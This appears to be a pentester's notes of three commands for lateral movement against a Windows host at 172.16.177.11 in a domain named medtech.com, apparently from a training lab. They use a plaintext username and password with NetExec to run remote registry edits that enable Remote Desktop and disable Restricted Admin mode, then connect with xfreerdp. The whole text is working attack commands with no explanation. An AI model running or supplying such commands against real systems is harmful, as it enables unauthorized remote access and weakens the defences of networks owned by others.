nxc smb 172.16.177.11 -u joe -p 'Flowers1' -d medtech.com -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'


nxc smb 172.16.177.11 -u joe -p 'Flowers1' -d medtech.com -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'        

xfreerdp /v:172.16.177.11 /u:joe /p:Flowers1 /cert-ignore /timeout:60000 /d:medtech.com